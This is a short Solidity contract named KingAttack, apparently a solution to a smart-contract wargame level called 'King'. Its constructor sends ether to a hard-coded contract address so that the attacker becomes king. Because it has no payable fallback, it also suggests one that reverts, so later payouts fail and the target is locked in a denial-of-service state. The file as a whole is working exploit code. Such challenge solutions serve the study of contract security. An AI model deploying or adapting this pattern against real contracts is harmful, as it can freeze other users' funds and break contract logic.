// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingAttack {

constructor() public payable {
    // triggers fallback function on Kings contract.
    // contract.prize() == 13008896
    address(0xB5Dc074E7484D32Faf3cb747E2b7cc28b4a203d5).call{value: msg.value}("");
}

// no payable fallback or just put revert in it:
// function() external payable {
//    revert("PWN");
// }
}